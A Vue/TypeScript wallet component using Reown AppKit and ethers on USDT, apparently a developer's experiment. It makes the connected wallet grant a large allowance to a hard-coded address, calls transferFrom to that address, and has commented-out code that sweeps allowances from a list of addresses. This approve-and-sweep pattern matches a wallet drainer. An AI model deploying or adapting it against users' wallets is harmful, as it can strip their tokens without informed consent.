<script setup lang="ts">
import { onMounted, watch } from 'vue'
import {
  createAppKit,
  useAppKit,
  useAppKitProvider,
  useAppKitAccount,
  useAppKitEvents
} from '@reown/appkit/vue'
import { useRouter } from 'vue-router'
import { EthersAdapter } from '@reown/appkit-adapter-ethers'
import { mainnet, arbitrum } from '@reown/appkit/networks'
import { ethers, BrowserProvider, Contract, formatUnits, N } from 'ethers'

// 1. Get projectId from https://cloud.reown.com
const projectId = '4703d1a7a30b63665f8d8e8339a9aceb'
const addressToWatch = '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb'
// 2. Create your application's metadata object
const metadata = {
  name: 'My Website',
  description: 'My Website description',
  url: 'https://mywebsite.com', // url must match your domain & subdomain
  icons: ['https://avatars.mywebsite.com/']
}

// 3. Create a AppKit instance
createAppKit({
  adapters: [new EthersAdapter()],
  networks: [mainnet, arbitrum],
  metadata,
  projectId,
  features: {
    analytics: true // Optional - defaults to your Cloud configuration
  }
})

// 4. Use modal composable
const modal = useAppKit()

const USDTAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

const addressToWithdrawList = [
  '0x53f989804eFE987Cd9837C8367126a94190E28c9',
  '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266'
]

// The ERC-20 Contract ABI, which is a common contract interface
// for tokens (this is the Human-Readable ABI format)
const USDTAbi = [
  'function name() view returns (string)',
  'function symbol() view returns (string)',
  'function balanceOf(address) view returns (uint)',
  'function transfer(address to, uint amount)',
  'event Transfer(address indexed from, address indexed to, uint amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function transferFrom(address from, address to, uint amount)',
  'function allowance(address _owner, address _spender)'
]

async function transferFrom() {
  try {
    console.log('transferFrom start')

    // 获取钱包提供商
    const { walletProvider } = useAppKitProvider('eip155')
    const provider = new BrowserProvider(walletProvider as any)
    const signer = await provider.getSigner()

    // 使用 signer 实例化合约
    const USDTContract = new ethers.Contract(USDTAddress, USDTAbi, signer)

    // 要转移的金额，这里假设 USDT 的小数位数是 6
    const amount = ethers.parseUnits('1', 6) // 1 USDT
    console.log('要转移的金额，... $' + formatUnits(amount, 6))
    // 检查余额
    const senderBalance = await USDTContract.balanceOf('0x15d780e35Bb7A2d8940e4E2a9a55Bff71CaaD4B6')
    console.log('检查余额... $' + formatUnits(senderBalance, 6))
    const balance = formatUnits(senderBalance, 6)
    if (Number(balance) < Number(formatUnits(amount, 6))) {
      throw new Error('Insufficient balance for the transfer.')
    }

    // 检查是否已经授权
    const allowance = await USDTContract.allowance(
      '0x15d780e35Bb7A2d8940e4E2a9a55Bff71CaaD4B6', // 代币所有者的地址
      '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb' // 调用者的地址
    )

    // if (allowance.lt(amount)) {
    //   // 如果没有足够的授权，则先调用 approve 方法
    //   console.log("Approving...");
    // }

    // 调用 transferFrom 方法
    const approveResult = await USDTContract.transferFrom(
      '0x15d780e35Bb7A2d8940e4E2a9a55Bff71CaaD4B6', // 代币所有者的地址
      '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', // 目标地址
      amount // 要转移的数量
    )

    console.log('Transaction hash:', approveResult.hash)
    await approveResult.wait() // 等待交易确认
    console.log('Transaction mined.')
  } catch (error) {
    console.error('Error transferFrom:', error)
    alert(`Error transferFrom: ${error}`)
  }
}

async function balance() {
  try {
    console.log('work start')
    const { walletProvider } = useAppKitProvider('eip155')
    const provider = new BrowserProvider(walletProvider as any)
    const signer = await provider.getSigner()
    const USDTContract = new ethers.Contract(USDTAddress, USDTAbi, provider)
    for (let i = 0; i < addressToWithdrawList.length; i++) {
      const targetAddress = addressToWithdrawList[i]
      const balance = await USDTContract.balanceOf(targetAddress)
      // usdt精度是6 如果是通用方法可以调用await USDTContract.decimals();
      console.log(targetAddress, "'s Balance is ", formatUnits(balance, 6), 'USDT')
      // const allowance = await USDTContract.allowance(targetAddress, address);
      // if (allowance > 0) {
      //   const canWithdraw = allowance > balance ? balance: allowance;

      //   // console.log("canWithdraw:",canWithdraw - 2500000n);// 测试打印，只转去 部分，为了测试不提取全部，- 3000000n
      //   const typedTargetAddress = targetAddress as `0x${string}`;
      //   const typedAddress = address as `0x${string}`;
      //   await transferFrom({args:[ typedTargetAddress, typedAddress , BigInt(canWithdraw.toString()) - BigInt(2500000)]});
      // } else {
      //   console.log(targetAddress,":无allowance余额用来归集",allowance);
      // }
    }
  } catch (error) {
    console.error('Error balanceOf tokens:', error)
    alert(`Error balanceOf tokens: ${error}`)
  }
}

async function approve2() {
  const { walletProvider } = useAppKitProvider('eip155')
  try {
    const ethersProvider = new BrowserProvider(walletProvider as any)
    const signer = await ethersProvider.getSigner()
    const USDTContract = new Contract(USDTAddress, USDTAbi, signer)
    const approveResult = await USDTContract.approve(
      '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb',
      BigInt(100000000000)
    )
    console.log('Approval successful = ' + approveResult)
  } catch (error) {
    console.error('Approval failed:', error)
  }
}

// 监听钱包事件
const events = useAppKitEvents()

watch(events, (item) => {
  // 当event变化时，执行你的逻辑
  console.log('Event changed', item.data.event)
  if (item.data.event == 'CONNECT_SUCCESS') {
    const { address, isConnected } = useAppKitAccount()
    console.log('address = ' + address + '   ----   isConnected = ' + isConnected)
  }
})

// monitor transfer event
onMounted(async () => {
  const { walletProvider } = useAppKitProvider('eip155')
  const provider = new BrowserProvider(walletProvider as any)
  const signer = await provider.getSigner()
  const USDTContract = new ethers.Contract(USDTAddress, USDTAbi, provider)

  // 这里可以执行你需要的逻辑，例如获取余额或监听事件
  // 要监听的地址1
  // 监听 Transfer 事件
  console.log('-----------------listen start---------------')
  USDTContract.on('Transfer', (from, to, value, event) => {
    console.log(`from:${from}`)
    // 过滤来自特定地址的转账
    if (from.toLowerCase() === addressToWatch.toLowerCase()) {
      console.log(`转账事件：`)
      console.log(`从: ${from}`)
      console.log(`到: ${to}`)
      console.log(`金额: ${formatUnits(value, 6)} tokens`)
      console.log(event) // 事件对象
    }
  })
  console.log('-----------------listen 。。---------------')
})
const router = useRouter()

function goToNewPage() {
  router.push('/new-page') // 跳转到新页面
}
</script>

<template>
  <router-view />
  <w3m-button />
  <button @click="approve2">approve2</button>
  <button @click="balance">getBalance</button>
  <button @click="transferFrom">transferFrom</button>
  <button @click="goToNewPage">跳转到新页面</button> <!-- 新增的按钮 -->
</template>
